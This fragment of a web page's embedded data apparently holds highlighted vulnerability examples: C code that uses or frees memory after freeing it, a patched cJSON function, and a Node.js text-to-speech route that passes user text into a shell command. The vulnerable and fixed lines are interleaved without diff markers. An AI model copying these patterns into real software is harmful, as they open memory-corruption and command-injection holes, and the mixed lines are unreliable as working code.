\u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003ebuf1R1\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003ebuf2R1\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003ebuf2R2\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003ebuf3R2\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    buf1R1 \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token function\"\u003emalloc\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eBUFSIZER1\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    buf2R1 \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token function\"\u003emalloc\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eBUFSIZER1\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003efree\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ebuf2R1\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    buf2R2 \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token function\"\u003emalloc\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eBUFSIZER2\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    buf3R2 \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token function\"\u003emalloc\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eBUFSIZER2\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003estrncpy\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ebuf2R1\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e argv\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e BUFSIZER1 \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003efree\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ebuf1R1\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003efree\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ebuf2R2\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003efree\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ebuf3R2\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"1c:T608,\u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003eptr \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token function\"\u003emalloc\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eSIZE\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eerr\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    abrt \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003efree\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eptr\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eabrt\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003elogError\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"operation aborted before commit\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e ptr\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n1d:T52d,static cJSON_bool add_item_to_object(cJSON * const object, const char * const string, cJSON * const item, const internal_hooks * const hooks, const cJSON_bool constant_key)\n{\n    char *new_key = NULL;\n    int new_type = cJSON_Invalid;\n\n    if ((object == NULL) || (string == NULL) || (item == NULL))\n    {\n        return false;\n    }\n\n    if (!(item-\u003etype \u0026 cJSON_StringIsConst) \u0026\u0026 (item-\u003estring != NULL))\n    {\n        hooks-\u003edeallocate(item-\u003estring);\n    }\n\n    if (constant_key)\n    {\n"])</script><script>self.__next_f.push([1,"        item-\u003estring = (char*)cast_away_const(string);\n        item-\u003etype |= cJSON_StringIsConst;\n        new_key = (char*)cast_away_const(string);\n        new_type = item-\u003etype | cJSON_StringIsConst;\n    }\n    else\n    {\n        char *key = (char*)cJSON_strdup((const unsigned char*)string, hooks);\n        if (key == NULL)\n        new_key = (char*)cJSON_strdup((const unsigned char*)string, hooks);\n        if (new_key == NULL)\n        {\n            return false;\n        }\n\n        item-\u003estring = key;\n        item-\u003etype \u0026= ~cJSON_StringIsConst;\n        new_type = item-\u003etype \u0026 ~cJSON_StringIsConst;\n    }\n\n    if (!(item-\u003etype \u0026 cJSON_StringIsConst) \u0026\u0026 (item-\u003estring != NULL))\n    {\n        hooks-\u003edeallocate(item-\u003estring);\n    }\n\n    item-\u003estring = new_key;\n    item-\u003etype = new_type;\n\n    return add_item_to_array(object, item);\n}\n1e:T2288,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003estatic\u003c/span\u003e cJSON_bool \u003cspan class=\"token function\"\u003eadd_item_to_object\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ecJSON \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e object\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e string\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e cJSON \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e item\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e internal_hooks \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e hooks\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e cJSON_bool constant_key\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003enew_key \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token constant\"\u003eNULL\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eint\u003c/span\u003e new_type \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e cJSON_Invalid\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eobject \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token constant\"\u003eNULL\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e||\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003estring \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token constant\"\u003eNULL\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e||\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eitem \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token constant\"\u003eNULL\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e false\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e!\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eitem\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003etype \u003cspan class=\"token operator\"\u003e\u0026amp;\u003c/span\u003e cJSON_StringIsConst\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eitem\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003estring \u003cspan class=\"token operator\"\u003e!=\u003c/span\u003e \u003cspan class=\"token constant\"\u003eNULL\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        hooks\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003e\u003cspan class=\"token function\"\u003edeallocate\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eitem\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003estring\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003econstant_key\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        item\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003estring \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e\u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token function\"\u003ecast_away_const\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003estring\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        item\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003etype \u003cspan class=\"token operator\"\u003e|=\u003c/span\u003e cJSON_StringIsConst\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        new_key \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e\u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token function\"\u003ecast_away_const\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003estring\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        new_type \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e item\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003etype \u003cspan class=\"token operator\"\u003e|\u003c/span\u003e cJSON_StringIsConst\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003ekey \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e\u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token function\"\u003ecJSON_strdup\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eunsigned\u003c/span\u003e \u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e\u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003estring\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e hooks\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ekey \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token constant\"\u003eNULL\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        new_key \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e\u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token function\"\u003ecJSON_strdup\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eunsigned\u003c/span\u003e \u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e\u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003estring\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e hooks\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003enew_key \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token constant\"\u003eNULL\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e false\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n        item\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003estring \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e key\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        item\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003etype \u003cspan class=\"token operator\"\u003e\u0026amp;=\u003c/span\u003e \u003cspan class=\"token operator\"\u003e~\u003c/span\u003ecJSON_StringIsConst\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        new_type \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e item\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003etype \u003cspan class=\"token operator\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"token operator\"\u003e~\u003c/span\u003ecJSON_StringIsConst\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e!\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eitem\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003etype \u003cspan class=\"token operator\"\u003e\u0026amp;\u003c/span\u003e cJSON_StringIsConst\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eitem\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003estring \u003cspan class=\"token operator\"\u003e!=\u003c/span\u003e \u003cspan class=\"token constant\"\u003eNULL\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        hooks\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003e\u003cspan class=\"token function\"\u003edeallocate\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eitem\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003estring\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n    item\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003estring \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e new_key\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    item\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003etype \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e new_type\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token function\"\u003eadd_item_to_array\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eobject\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e item\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"1f:T481,/** GET synthesize voice based on a voice model */\nrouter.get('/tts', (req, res) =\u003e {\n  const { text, type } = req.query;\n  // TODO(twattanavekin): Test Unicode text.\n  const escapedText = JSON.stringify(text).slice(1, -1);\n  const sanitizedText = utils.replaceCharactersWithSpaces(text);\n\n  // Example command:\n  //  echo \"hello\" | ${SYNTH_SCRIPT}\n\n  const cmd = `echo \"${escapedText}\" | ${SYNTH_SCRIPT}`;\n  console.log(`Running command - \\n${cmd}`);\n  console.log(`Synthesizing ${sanitizedText}`);\n\n  const options = {\n    maxBuffer: 1024 * 1000, // 1 mb buffer\n    cwd: '/tmp/',\n    timeout: 60000, // 1 minute timeout\n    encoding: 'buffer',\n  };\n\n  exec(cmd, options, (err, stdout, stderr) =\u003e {\n  const child = exec(SYNTH_SCRIPT, options, (err, stdout, stderr) =\u003e {\n    const errMsg = utils.getExecErrorMessage(err, stderr);\n    if (errMsg) {\n      return res.status(500).send(errMsg);\n    }\n    res.status(200);\n    res.set('Content-Type', 'audio/wav');\n    const data = type === 'base64' ? stdout.toString('base64') : stdout;\n    return res.send(data);\n  });\n  child.stdin.write(sanitizedText);\n  child.stdin.end();\n});\n\nmodule.exports = router;\n20:T2503,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token comment\"\u003e/** GET synthesize voice based on a voice model */\u003c/span\u003e\nrouter\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eget\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'/tts'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003ereq\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e res\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e text\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e type \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e req\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003equery\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"token comment\"\u003e// TODO(twattanavekin): Test Unicode text.\u003c/span\u003e\n  \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e escapedText \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token constant\"\u003eJSON\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003estringify\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eslice\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e sanitizedText \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e utils\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ereplaceCharactersWithSpaces\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n  \u003cspan class=\"token comment\"\u003e// Example command:\u003c/span\u003e\n  \u003cspan class=\"token comment\"\u003e//  echo \"hello\" | ${SYNTH_SCRIPT}\u003c/span\u003e\n\n  \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e cmd \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token template-string\"\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003cspan class=\"token string\"\u003eecho \"\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token interpolation-punctuation punctuation\"\u003e${\u003c/span\u003eescapedText\u003cspan class=\"token interpolation-punctuation punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e\" | \u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token interpolation-punctuation punctuation\"\u003e${\u003c/span\u003e\u003cspan class=\"token constant\"\u003eSYNTH_SCRIPT\u003c/span\u003e\u003cspan class=\"token interpolation-punctuation punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  console\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003elog\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token template-string\"\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003cspan class=\"token string\"\u003eRunning command - \\n\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token interpolation-punctuation punctuation\"\u003e${\u003c/span\u003ecmd\u003cspan class=\"token interpolation-punctuation punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  console\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003elog\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token template-string\"\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003cspan class=\"token string\"\u003eSynthesizing \u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token interpolation-punctuation punctuation\"\u003e${\u003c/span\u003esanitizedText\u003cspan class=\"token interpolation-punctuation punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token template-punctuation string\"\u003e`\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n  \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e options \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token literal-property property\"\u003emaxBuffer\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e 